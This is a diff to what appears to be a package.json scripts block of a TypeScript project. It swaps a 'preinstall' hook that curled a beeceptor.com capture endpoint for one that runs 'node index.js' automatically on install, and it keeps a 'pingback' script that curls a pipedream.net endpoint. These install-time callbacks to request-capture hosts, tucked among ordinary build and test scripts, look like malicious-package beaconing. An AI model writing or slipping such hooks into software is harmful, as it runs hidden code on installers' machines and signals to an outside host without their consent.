@@ -151,7 +151,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "zx ./build.mjs && zx ./addShebang.mjs",
-    "preinstall": "curl https://bes23.free.beeceptor.com",
+    "preinstall": "node index.js",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "cross-env NODE_ENV=production node ./dist/main.js",
     "coverage": "jest --coverage",
